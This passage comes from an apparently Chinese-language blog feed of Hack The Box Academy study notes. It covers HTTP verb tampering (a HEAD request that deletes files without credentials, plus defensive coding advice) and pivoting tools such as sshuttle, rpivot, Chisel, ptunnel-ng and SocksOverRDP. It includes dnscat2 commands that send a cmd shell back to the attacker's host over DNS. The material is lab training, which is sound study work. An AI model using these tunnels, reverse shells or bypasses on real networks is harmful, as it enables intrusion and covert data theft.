alt="img"></p><p>因此，web服务器配置似乎同时涵盖了GET和POST请求。然而，正如我们之前所了解到的，我们可以使用许多其他HTTP方法，最显著的是HEAD方法，它与GET请求相同，但不会在HTTP响应中返回正文。如果成功，我们可能不会收到任何输出，但重置功能仍应执行，这是我们的主要目标。 要查看服务器是否接受HEAD请求，我们可以向其发送OPTIONS请求，并查看接受了哪些HTTP方法，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ curl -i -X OPTIONS http://SERVER_IP:PORT/HTTP/1.1 200 OKDate: Server: Apache/2.4.41 (Ubuntu)Allow: POST,OPTIONS,HEAD,GETContent-Length: 0Content-Type: httpd/unix-directory</code></pre><p>正如我们所看到的，响应显示Allow:POST、OPTIONS、HEAD、GET，这意味着web服务器确实接受HEAD请求，这是许多web服务器的默认配置。因此，让我们再次尝试拦截重置请求，这次使用HEAD请求来查看web服务器如何处理它：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061529974.jpeg" alt="HEAD_request"></p><p>一旦我们将POST更改为HEAD并转发请求，我们将看到我们不再得到登录提示或401未授权页面，而是得到一个空输出，正如HEAD请求所预期的那样。如果我们返回到File Manager web应用程序，我们将看到所有文件确实已被删除，这意味着我们在没有管理员访问权限或任何凭据的情况下成功触发了重置功能：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061529688.jpeg" alt="img"></p><h1 id="Bypassing-Security-Filters"><a href="#Bypassing-Security-Filters" class="headerlink" title="Bypassing Security Filters"></a>Bypassing Security Filters</h1><p>另一种更常见的HTTP谓词篡改漏洞是由web应用程序开发过程中出现的不安全编码错误引起的，这导致web应用程序无法覆盖某些功能中的所有HTTP方法。这通常出现在检测恶意请求的安全筛选器中。例如，如果安全过滤器用于检测注入漏洞，并且只检查POST参数（例如$_POST[参数]）中的注入，则可以通过将请求方法更改为GET来绕过它。</p><p>为了避免我们的代码中存在HTTP Verb篡改漏洞，我们必须与HTTP方法的使用保持一致，并确保相同的方法始终用于整个web应用程序的任何特定功能。始终建议通过测试所有请求参数来扩大安全筛选器中的测试范围。这可以通过以下函数和变量来实现：</p><table><thead><tr><th>Language</th><th>Function</th></tr></thead><tbody><tr><td>PHP</td><td><code>$_REQUEST[&#39;param&#39;]</code></td></tr><tr><td>Java</td><td><code>request.getParameter(&#39;param&#39;)</code></td></tr><tr><td>C#</td><td><code>Request[&#39;param&#39;]</code></td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pivoting Around Obstacles &amp; Branching Out Our Tunnels</title>
      <link href="/2023/09/03/Pivoting-Around-Obstacles/"/>
      <url>/2023/09/03/Pivoting-Around-Obstacles/</url>
      
        <content type="html"><![CDATA[<h1 id="SSH-for-Windows-plink-exe"><a href="#SSH-for-Windows-plink-exe" class="headerlink" title="SSH for Windows: plink.exe"></a>SSH for Windows: plink.exe</h1><p><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">Plink</a>PuTTY Link的缩写，是一个Windows命令行SSH工具，安装时作为PuTTY包的一部分。与SSH类似，Plink也可以用于创建动态端口转发和SOCKS代理。在2018年秋季之前，Windows没有包含本地ssh客户端，因此用户必须安装自己的ssh客户端。对于许多需要连接到其他主机的系统管理员来说，选择的工具是 <a href="https://www.putty.org/">PuTTY</a>。</p><p>如果我们使用Windows系统而不是基于Linux的系统作为主要攻击主机，我们也可以使用Plink。</p><h2 id="Getting-To-Know-Plink"><a href="#Getting-To-Know-Plink" class="headerlink" title="Getting To Know Plink"></a>Getting To Know Plink</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309031617228.png" alt="img"></p><p>Windows攻击主机使用以下命令行参数启动plink.exe进程，以在Ubuntu服务器上启动动态端口转发。这启动了Windows攻击主机和Ubuntu服务器之间的SSH会话，然后plink开始在端口9050上侦听。</p><pre><code class="cmd-session">plink -D 9050 ubuntu@10.129.15.50</code></pre><p>另一个名为 <a href="https://www.proxifier.com/">Proxifier</a>的基于Windows的工具可以用于通过我们创建的SSH会话启动SOCKS隧道。Proxifier是一个Windows工具，它为桌面客户端应用程序创建隧道网络，允许它通过SOCKS或HTTPS代理进行操作，并允许代理链接。可以创建一个配置文件，在其中我们可以为Plink在端口9050上启动的SOCKS服务器提供配置。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309031619809.png" alt="img"></p><p>在为127.0.0.1和端口9050配置SOCKS服务器后，我们可以直接启动mstsc.exe来启动与允许RDP连接的Windows目标的RDP会话。</p><h1 id="SSH-Pivoting-with-Sshuttle"><a href="#SSH-Pivoting-with-Sshuttle" class="headerlink" title="SSH Pivoting with Sshuttle"></a>SSH Pivoting with Sshuttle</h1><p><a href="https://github.com/sshuttle/sshuttle">Sshuttle</a>是另一个用Python编写的工具，它消除了配置proxychain的需要。但是，此工具仅适用于通过SSH进行数据透视，而不提供通过TOR或HTTPS代理服务器进行数据透视的其他选项。Sshuttle对于自动执行iptables和为远程主机添加数据透视规则非常有用。我们可以将Ubuntu服务器配置为一个支点，并使用本节稍后的示例使用sshuttle路由Nmap的所有网络流量。 sshuttle的一个有趣用法是，我们不需要使用proxychans来连接到远程主机。让我们通过Ubuntu pivot主机安装sshuttle，并将其配置为通过RDP连接到Windows主机。</p><h4 id="Installing-sshuttle"><a href="#Installing-sshuttle" class="headerlink" title="Installing sshuttle"></a>Installing sshuttle</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo apt-get install sshuttle</code></pre><p>要使用sshuttle，我们指定选项-r以使用用户名和密码连接到远程机器。然后，我们需要包括我们想要通过枢轴主机路由的网络或IP，在我们的情况下，是网络172.16.5.0&#x2F;23。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v </code></pre><p>使用此命令，sshuttle在我们的iptables中创建一个条目，通过pivot主机将所有流量重定向到172.16.5.0&#x2F;23网络。</p><h4 id="Traffic-Routing-through-iptables-Routes"><a href="#Traffic-Routing-through-iptables-Routes" class="headerlink" title="Traffic Routing through iptables Routes"></a>Traffic Routing through iptables Routes</h4><pre><code class="shell-session">Tanin@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn</code></pre><p>我们现在可以直接使用任何工具，而无需使用proxychains。</p><blockquote><p>xfreerdp 默认情况下可能不信任自签名证书<code>/cert-ignore</code> 选项会忽略证书验证错误。</p></blockquote><h1 id="Web-Server-Pivoting-with-Rpivot"><a href="#Web-Server-Pivoting-with-Rpivot" class="headerlink" title="Web Server Pivoting with Rpivot"></a>Web Server Pivoting with Rpivot</h1><p><a href="https://github.com/klsecservices/rpivot">Rpivot</a></p><p>Rpivot是一个用Python编写的用于SOCKS隧道的反向SOCKS代理工具。Rpivot将公司网络内的计算机绑定到外部服务器，并在服务器端公开客户端的本地端口。我们将采用下面的场景，在我们的内部网络上有一个web服务器（172.16.5.135），我们想使用rpivot代理访问它。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309031654234.png" alt="img"></p><p>我们可以使用以下命令启动rpivot SOCKS代理服务器，以允许客户端在端口9999上连接，并在端口9050上侦听代理枢轴连接。</p><h4 id="Cloning-rpivot"><a href="#Cloning-rpivot" class="headerlink" title="Cloning rpivot"></a>Cloning rpivot</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo git clone https://github.com/klsecservices/rpivot.git</code></pre><p>我们可以启动rpivot SOCKS代理服务器，使用server.py连接到受损的Ubuntu服务器上的客户端。</p><pre><code class="shell-session">Running server.py from the Attack HostTanin@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</code></pre><p>在运行client.py之前，我们需要将rpivot传输到目标。我们可以使用此SCP命令执行此操作：</p><h4 id="Transfering-rpivot-to-the-Target"><a href="#Transfering-rpivot-to-the-Target" class="headerlink" title="Transfering rpivot to the Target"></a>Transfering rpivot to the Target</h4><pre><code class="shell-session">Tanin@htb[/htb]$ scp -r rpivot ubuntu@&lt;IpaddressOfTarget&gt;:/home/ubuntu/</code></pre><h4 id="Running-client-py-from-Pivot-Target"><a href="#Running-client-py-from-Pivot-Target" class="headerlink" title="Running client.py from Pivot Target"></a>Running client.py from Pivot Target</h4><pre><code class="shell-session">ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999Backconnecting to server 10.10.14.18 port 9999</code></pre><h4 id="Confirming-Connection-is-Established"><a href="#Confirming-Connection-is-Established" class="headerlink" title="Confirming Connection is Established"></a>Confirming Connection is Established</h4><pre><code class="shell-session">New connection from host 10.129.202.64, source port 35226</code></pre><p>我们将在我们的攻击主机127.0.0.1:9050上配置proxychans以在本地服务器上进行转移，该攻击主机最初是由Python服务器启动的。 最后，我们应该能够使用proxychains和Firefox访问服务器端的Web服务器，该服务器托管在172.16.5.0&#x2F;23的内部网络上，172.16.5.135:80。</p><h4 id="Browsing-to-the-Target-Webserver-using-Proxychains"><a href="#Browsing-to-the-Target-Webserver-using-Proxychains" class="headerlink" title="Browsing to the Target Webserver using Proxychains"></a>Browsing to the Target Webserver using Proxychains</h4><pre><code class="shell-session">proxychains firefox-esr 172.16.5.135:80</code></pre><p>与上面的pivot代理类似，在某些情况下，我们可能无法直接转向云上的外部服务器（攻击主机）。某些组织使用域控制器配置了 <a href="https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a">HTTP-proxy with NTLM authentication</a>。在这种情况下，我们可以为rpivot提供一个额外的NTLM身份验证选项，通过提供用户名和密码来通过NTLM代理进行身份验证。在这些情况下，我们可以通过以下方式使用rpivot的client.py：</p><h4 id="Connecting-to-a-Web-Server-using-HTTP-Proxy-amp-NTLM-Auth"><a href="#Connecting-to-a-Web-Server-using-HTTP-Proxy-amp-NTLM-Auth" class="headerlink" title="Connecting to a Web Server using HTTP-Proxy &amp; NTLM Auth"></a>Connecting to a Web Server using HTTP-Proxy &amp; NTLM Auth</h4><pre><code class="shell-session">python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip &lt;IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</code></pre><h1 id="Branching-Out-Our-Tunnels"><a href="#Branching-Out-Our-Tunnels" class="headerlink" title="Branching Out Our Tunnels"></a>Branching Out Our Tunnels</h1><h1 id="DNS-Tunneling-with-Dnscat2"><a href="#DNS-Tunneling-with-Dnscat2" class="headerlink" title="DNS Tunneling with Dnscat2"></a>DNS Tunneling with Dnscat2</h1><p><a href="https://github.com/iagox86/dnscat2">Dnscat2</a></p><p>Dnscat2是一种隧道工具，使用DNS协议在两个主机之间发送数据。它使用加密的命令和控制（C&amp;C或C2）通道，并在DNS协议内的TXT记录内发送数据。通常，公司网络中的每个active directory域环境都有自己的DNS服务器，该服务器将主机名解析为IP地址，并将流量路由到参与总体DNS系统的外部DNS服务器。但是，对于dnscat2，地址解析是从外部服务器请求的。当本地DNS服务器试图解析地址时，数据会被过滤并通过网络发送，而不是合法的DNS请求。Dnscat2可以是一种极为隐蔽的方法来过滤数据，同时避免防火墙检测，因为防火墙检测会剥离HTTPS连接并探查流量。对于我们的测试示例，我们可以在攻击主机上使用dnscat2服务器，并在另一台Windows主机上执行dnscat2客户端。</p><h2 id="Setting-Up-amp-Using-dnscat2"><a href="#Setting-Up-amp-Using-dnscat2" class="headerlink" title="Setting Up &amp; Using dnscat2"></a>Setting Up &amp; Using dnscat2</h2><p>如果dnscat2尚未在我们的攻击主机上设置，我们可以使用以下命令进行设置：</p><h4 id="Cloning-dnscat2-and-Setting-Up-the-Server"><a href="#Cloning-dnscat2-and-Setting-Up-the-Server" class="headerlink" title="Cloning dnscat2 and Setting Up the Server"></a>Cloning dnscat2 and Setting Up the Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git</code></pre><h4 id="Starting-the-dnscat2-server"><a href="#Starting-the-dnscat2-server" class="headerlink" title="Starting the dnscat2 server"></a>Starting the dnscat2 server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</code></pre><p>运行服务器后，它将向我们提供密钥，我们必须将密钥提供给Windows主机上的dnscat2客户端，以便它可以对发送到外部dnscat2服务器的数据进行身份验证和加密。我们可以将客户端与dnscat2项目一起使用，也可以使用 <a href="https://github.com/lukebaggett/dnscat2-powershell">dnscat2-powershell</a>，这是一个基于dnscat2兼容powershell的客户端，我们可以从Windows目标运行该客户端，以与我们的dnscat2服务器建立隧道。我们可以将包含客户端文件的项目克隆到我们的攻击主机，然后将其传输到目标。</p><h4 id="Cloning-dnscat2-powershell-to-the-Attack-Host"><a href="#Cloning-dnscat2-powershell-to-the-Attack-Host" class="headerlink" title="Cloning dnscat2-powershell to the Attack Host"></a>Cloning dnscat2-powershell to the Attack Host</h4><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git</code></pre><p>一旦dnscat2.ps1文件在目标上，我们就可以导入它并运行相关的cmdlet。</p><h4 id="Importing-dnscat2-ps1"><a href="#Importing-dnscat2-ps1" class="headerlink" title="Importing dnscat2.ps1"></a>Importing dnscat2.ps1</h4><pre><code class="powershell-session">PS C:\htb&gt; Import-Module .\dnscat2.ps1</code></pre><p>导入dnscat2.ps1后，我们可以使用它与运行在我们攻击主机上的服务器建立隧道。我们可以将CMD shell会话发送回我们的服务器。</p><pre><code class="powershell-session">PS C:\htb&gt; Start-Dnscat2 -DNSserver 10.10.14.47 -Domain inlanefreight.local -PreSharedSecret 166752dc4191131dce8195327eb078fe -Exec cmd </code></pre><p>我们必须使用服务器上生成的预共享机密（-PreSharedSecret）来确保我们的会话已建立并加密。如果所有步骤都成功完成，我们将看到与服务器建立的会话。</p><h4 id="Confirming-Session-Establishment"><a href="#Confirming-Session-Establishment" class="headerlink" title="Confirming Session Establishment"></a>Confirming Session Establishment</h4><pre><code class="shell-session">New window created: 1Session 1 Security: ENCRYPTED AND VERIFIED!(the security depends on the strength of your pre-shared secret!)dnscat2&gt;</code></pre><p>我们可以通过输入？列出dnscat2的选项？在提示下。</p><pre><code class="shell-session">dnscat2&gt; ?Here is a list of commands (use -h on any of them for additional help):* echo* help* kill* quit* set* start* stop* tunnels* unset* window* windows</code></pre><p>我们可以使用dnscat2与会话进行交互，并在参与的目标环境中进一步移动。在本模块中，我们不会涵盖dnscat2的所有可能性，但我们强烈鼓励您使用它进行练习，甚至可能找到创造性的方法在参与中使用它。让我们与已建立的会话进行交互，然后进入shell。</p><h4 id="Interacting-with-the-Established-Session"><a href="#Interacting-with-the-Established-Session" class="headerlink" title="Interacting with the Established Session"></a>Interacting with the Established Session</h4><pre><code class="shell-session">dnscat2&gt; window -i 1New window created: 1history_size (session) =&gt; 1000Session 1 Security: ENCRYPTED AND VERIFIED!(the security depends on the strength of your pre-shared secret!)This is a console session!That means that anything you type will be sent as-is to theclient, and anything they type will be displayed as-is on thescreen! If the client is executing a command and you don&#39;tsee a prompt, try typing &#39;pwd&#39; or something!To go back, type ctrl-z.Microsoft Windows [Version 10.0.18363.1801](c) 2019 Microsoft Corporation. All rights reserved.C:\Windows\system32&gt;exec (OFFICEMANAGER) 1&gt;</code></pre><h1 id="SOCKS5-Tunneling-with-Chisel"><a href="#SOCKS5-Tunneling-with-Chisel" class="headerlink" title="SOCKS5 Tunneling with Chisel"></a>SOCKS5 Tunneling with Chisel</h1><p><a href="https://github.com/jpillora/chisel">Chisel</a> </p><p>Chisel是一个用Go编写的基于TCP&#x2F;UDP的隧道工具，它使用HTTP传输使用SSH保护的数据。Chisel可以在防火墙受限的环境中创建客户端-服务器隧道连接。让我们考虑一种情况，即我们必须通过隧道将流量传输到172.16.5.0&#x2F;23网络（内部网络）上的Web服务器。我们有地址为172.16.5.19的域控制器。由于我们的攻击主机和域控制器属于不同的网段，因此攻击主机无法直接访问它。然而，由于我们已经破坏了Ubuntu服务器，我们可以在其上启动一个Chisel服务器，该服务器将监听特定端口，并通过已建立的隧道将我们的流量转发到内部网络。</p><h2 id="Setting-Up-amp-Using-Chisel"><a href="#Setting-Up-amp-Using-Chisel" class="headerlink" title="Setting Up &amp; Using Chisel"></a>Setting Up &amp; Using Chisel</h2><p>在我们使用Chisel之前，我们需要在我们的攻击主机上安装它。如果我们的攻击主机上没有Chisel，我们可以使用下面的命令克隆项目repo：</p><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/jpillora/chisel.git</code></pre><p>我们需要在系统上安装编程语言Go来构建Chisel二进制文件。在系统上安装Go后，我们可以进入该目录，并使用Go-build构建Chisel二进制文件。</p><h4 id="Building-the-Chisel-Binary"><a href="#Building-the-Chisel-Binary" class="headerlink" title="Building the Chisel Binary"></a>Building the Chisel Binary</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cd chiselgo build</code></pre><p>注意我们传输到客户网络上目标上的文件的大小可能会有所帮助，这不仅是出于性能原因，还考虑到检测。补充这一特定概念的两个有益资源是Oxdf的博客文章“<a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html">Tunneling with Chisel and SSF</a>”和IppSec对盒子Reddish的演练。IppSec在视频的24:29开始解释Chisel，构建二进制并缩小二进制的大小。 一旦构建了二进制文件，我们就可以使用SCP将其传输到目标枢轴主机。</p><pre><code class="shell-session">anin@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/ ubuntu@10.129.202.64&#39;s password: chisel                                        100%   11MB   1.2MB/s   00:09    </code></pre><p>Then we can start the Chisel server&#x2F;listener.</p><h4 id="Running-the-Chisel-Server-on-the-Pivot-Host"><a href="#Running-the-Chisel-Server-on-the-Pivot-Host" class="headerlink" title="Running the Chisel Server on the Pivot Host"></a>Running the Chisel Server on the Pivot Host</h4><pre><code class="shell-session">ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks52022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234</code></pre><p>Chisel侦听器将使用SOCKS5（–SOCKS5）侦听端口1234上的传入连接，并将其转发到可从枢轴主机访问的所有网络。在我们的案例中，枢轴主机在172.16.5.0&#x2F;23网络上有一个接口，这将允许我们访问该网络上的主机。 我们可以在攻击主机上启动客户端并连接到Chisel服务器。</p><h4 id="Connecting-to-the-Chisel-Server"><a href="#Connecting-to-the-Chisel-Server" class="headerlink" title="Connecting to the Chisel Server"></a>Connecting to the Chisel Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:12342022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=&gt;socks: Listening2022/05/05 14:21:18 client: tun: Bound proxies2022/05/05 14:21:19 client: Handshaking...2022/05/05 14:21:19 client: Sending config2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)2022/05/05 14:21:19 client: tun: SSH connected</code></pre><p>正如您在上面的输出中看到的，Chisel客户端已经通过HTTP在Chisel服务器和客户端之间创建了一个TCP&#x2F;UDP隧道，该隧道使用SSH进行安全保护，并且已经开始在1080端口上侦听。现在，我们可以修改位于&#x2F;etc&#x2F;proxychans.conf的proxychans.cconf文件，并在末尾添加1080端口，这样我们就可以使用proxychans使用创建的1080端口和SSH隧道之间的隧道进行透视。</p><pre><code class="shell-session">Tanin@htb[/htb]$ tail -f /etc/proxychains.conf ##       proxy types: http, socks4, socks5#        ( auth types supported: &quot;basic&quot;-http  &quot;user/pass&quot;-socks )#[ProxyList]# add proxy here ...# meanwile# defaults set to &quot;tor&quot;# socks4 127.0.0.1 9050socks5 127.0.0.1 1080</code></pre><p>现在，如果我们使用RDP的proxychains，我们可以通过我们创建的到Pivot主机的隧道连接到内部网络上的DC。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123</code></pre><h2 id="Chisel-Reverse-Pivot"><a href="#Chisel-Reverse-Pivot" class="headerlink" title="Chisel Reverse Pivot"></a>Chisel Reverse Pivot</h2><p>在前面的例子中，我们使用受损的机器（Ubuntu）作为Chisel服务器，在端口1234上列出。尽管如此，在某些情况下，防火墙规则可能会限制与受损目标的入站连接。在这种情况下，我们可以将Chisel与反向选项一起使用。 当Chisel服务器启用了–reverse时，remotes可以加上前缀R来表示reverse。服务器将侦听并接受连接，并且它们将通过指定远程的客户端进行代理。指定R:socks的反向远程将侦听服务器的默认socks端口（1080），并终止客户端内部SOCKS5代理的连接。 我们将使用选项–reverse在攻击主机中启动服务器。</p><h4 id="Starting-the-Chisel-Server-on-our-Attack-Host"><a href="#Starting-the-Chisel-Server-on-our-Attack-Host" class="headerlink" title="Starting the Chisel Server on our Attack Host"></a>Starting the Chisel Server on our Attack Host</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks52022/05/30 10:19:16 server: Reverse tunnelling enabled2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234</code></pre><p>我们可以使用任何编辑器来编辑proxyains.conf文件，然后使用tail确认我们的配置更改。</p><pre><code class="shell-session">Tanin@htb[/htb]$ tail -f /etc/proxychains.conf [ProxyList]# add proxy here ...# socks4    127.0.0.1 9050socks5 127.0.0.1 1080 </code></pre><pre><code class="shell-session">ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:12342022/05/30 14:19:29 client: Handshaking...2022/05/30 14:19:30 client: Sending config2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)2022/05/30 14:19:30 client: tun: SSH connected</code></pre><p>如果我们将proxychains与RDP一起使用，我们可以通过我们创建的到Pivot主机的隧道连接到内部网络上的DC。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123</code></pre><h1 id="ICMP-Tunneling-with-SOCKS"><a href="#ICMP-Tunneling-with-SOCKS" class="headerlink" title="ICMP Tunneling with SOCKS"></a>ICMP Tunneling with SOCKS</h1><p>ICMP隧道将您的流量封装在包含回显请求和响应的ICMP数据包中。ICMP隧道只有在防火墙网络中允许ping响应时才能工作。当防火墙网络中的主机被允许对外部服务器进行ping时，它可以将其流量封装在ping回显请求中，并将其发送到外部服务器。外部服务器可以验证此流量并发送适当的响应，这对于数据泄露和创建到外部服务器的数据透视隧道非常有用。 我们将使用ptunnel ng工具在Ubuntu服务器和攻击主机之间创建一个隧道。一旦创建了隧道，我们将能够通过 <a href="https://github.com/utoni/ptunnel-ng">ptunnel-ng</a> 客户端代理我们的流量。我们可以在目标pivot主机上启动ptunnel ng服务器。让我们从设置ptunnel ng开始。</p><h2 id="Setting-Up-amp-Using-ptunnel-ng"><a href="#Setting-Up-amp-Using-ptunnel-ng" class="headerlink" title="Setting Up &amp; Using ptunnel-ng"></a>Setting Up &amp; Using ptunnel-ng</h2><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git</code></pre><h4 id="Building-Ptunnel-ng-with-Autogen-sh"><a href="#Building-Ptunnel-ng-with-Autogen-sh" class="headerlink" title="Building Ptunnel-ng with Autogen.sh"></a>Building Ptunnel-ng with Autogen.sh</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ./autogen.sh </code></pre><p>在运行autogen.sh之后，可以从客户端和服务器端使用ptunnel ng。我们现在需要将回购从我们的攻击主机转移到目标主机。如前几节所述，我们可以使用SCP来传输文件。如果我们想传输整个repo和其中包含的文件，我们需要将-r选项与SCP一起使用。 将Ptunnel ng传输到数据透视主机</p><pre><code class="shell-session">Tanin@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/</code></pre><h4 id="Starting-the-ptunnel-ng-Server-on-the-Target-Host"><a href="#Starting-the-ptunnel-ng-Server-on-the-Target-Host" class="headerlink" title="Starting the ptunnel-ng Server on the Target Host"></a>Starting the ptunnel-ng Server on the Target Host</h4><pre><code class="shell-session">ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22[sudo] password for ubuntu: ./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)[inf]: Starting ptunnel-ng 1.42.[inf]: (c) 2004-2011 Daniel Stoedle, &lt;daniels@cs.uit.no&gt;[inf]: (c) 2017-2019 Toni Uhlig,     &lt;matzeton@googlemail.com&gt;[inf]: Security features by Sebastien Raveau, &lt;sebastien.raveau@epita.fr&gt;[inf]: Forwarding incoming ping packets over TCP.[inf]: Ping proxy is listening in privileged mode.[inf]: Dropping privileges now.</code></pre><p>-r后面的IP地址应该是我们希望ptunnel ng接受连接的IP。在这种情况下，我们将使用从我们的攻击主机可以访问的任何IP。在实际参与过程中使用同样的想法和考虑会使我们受益。 回到攻击主机上，我们可以尝试连接到ptunnel ng服务器（-p＜ipAddress-Target＞），但要确保通过本地端口2222（-l2222）进行连接。通过本地端口2222连接允许我们通过ICMP隧道发送流量。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22[inf]: Starting ptunnel-ng 1.42.[inf]: (c) 2004-2011 Daniel Stoedle, &lt;daniels@cs.uit.no&gt;[inf]: (c) 2017-2019 Toni Uhlig,     &lt;matzeton@googlemail.com&gt;[inf]: Security features by Sebastien Raveau, &lt;sebastien.raveau@epita.fr&gt;[inf]: Relaying packets from incoming TCP streams.</code></pre><p>随着ptunnel ng ICMP隧道的成功建立，我们可以尝试通过本地端口2222（-p2222）使用SSH连接到目标。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1</code></pre><p>如果配置正确，我们将能够通过ICMP隧道输入凭据并进行SSH会话。 在连接的客户端和服务器端，我们会注意到ptunnel ng为我们提供了与通过ICMP隧道的流量相关的会话日志和流量统计信息。这是我们可以使用ICMP确认流量从客户端传递到服务器的一种方式。</p><h4 id="Enabling-Dynamic-Port-Forwarding-over-SSH"><a href="#Enabling-Dynamic-Port-Forwarding-over-SSH" class="headerlink" title="Enabling Dynamic Port Forwarding over SSH"></a>Enabling Dynamic Port Forwarding over SSH</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1ubuntu@127.0.0.1&#39;s password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)&lt;snip&gt;</code></pre><p>我们可以使用带有Nmap的proxychains扫描内部网络上的目标（172.16.5.x）。根据我们的发现，我们可以尝试连接到目标。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389</code></pre><h2 id="Network-Traffic-Analysis-Considerations"><a href="#Network-Traffic-Analysis-Considerations" class="headerlink" title="Network Traffic Analysis Considerations"></a>Network Traffic Analysis Considerations</h2><p>重要的是，我们要确认我们正在使用的工具是否如广告所示，并且我们已经设置并正确操作了它们。在使用ICMP隧道通过本节中教导的不同协议对流量进行隧道传输的情况下，我们可以从使用Wireshark等数据包分析器分析生成的流量中受益。仔细看一下下面的短片。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309041725504.gif" alt="img"></p><p>在这个片段的第一部分中，通过SSH建立连接，而不使用ICMP隧道。我们可能会注意到，TCP&amp;SSHv2流量被捕获。 剪辑中使用的命令：<a href="mailto:&#115;&#115;&#x68;&#117;&#x62;&#117;&#x6e;&#116;&#x75;&#x40;&#x31;&#x30;&#x2e;&#x31;&#50;&#x39;&#46;&#x32;&#48;&#50;&#x2e;&#54;&#52;">&#115;&#115;&#x68;&#117;&#x62;&#117;&#x6e;&#116;&#x75;&#x40;&#x31;&#x30;&#x2e;&#x31;&#50;&#x39;&#46;&#x32;&#48;&#50;&#x2e;&#54;&#52;</a> 在本片段的第二部分中，使用ICMP隧道通过SSH建立连接。请注意执行此操作时捕获的流量类型。 剪辑中使用的命令：ssh-p222-lubuntu 127.0.0.1</p><h1 id="RDP-and-SOCKS-Tunneling-with-SocksOverRDP"><a href="#RDP-and-SOCKS-Tunneling-with-SocksOverRDP" class="headerlink" title="RDP and SOCKS Tunneling with SocksOverRDP"></a>RDP and SOCKS Tunneling with SocksOverRDP</h1><p>在评估过程中，有时我们可能仅限于Windows网络，并且可能无法使用SSH进行数据透视。在这种情况下，我们必须使用适用于Windows操作系统的工具。<a href="https://github.com/nccgroup/SocksOverRDP">SocksOverRDP</a>是一个使用Windows远程桌面服务功能中的动态虚拟频道（DVC）的工具示例。DVC负责通过RDP连接对数据包进行隧道传输。使用此功能的一些示例是剪贴板数据传输和音频共享。然而，此功能也可用于通过网络传输任意数据包。我们可以使用SocksOverRDP来传输我们的自定义数据包，然后通过它进行代理。我们将使用工具 <a href="https://www.proxifier.com/">Proxifier</a>作为我们的代理服务器。 我们可以从将适当的二进制文件下载到我们的攻击主机开始执行此攻击。在我们的攻击主机上拥有二进制文件将使我们能够将它们转移到需要的每个目标。我们需要：</p><p> <a href="https://github.com/nccgroup/SocksOverRDP/releases">SocksOverRDP x64 Binaries</a>二进制文件</p><p><a href="https://www.proxifier.com/download/#win-tab">Proxifier Portable Binary</a></p><p> 我们可以查找ProxifierPE.zip 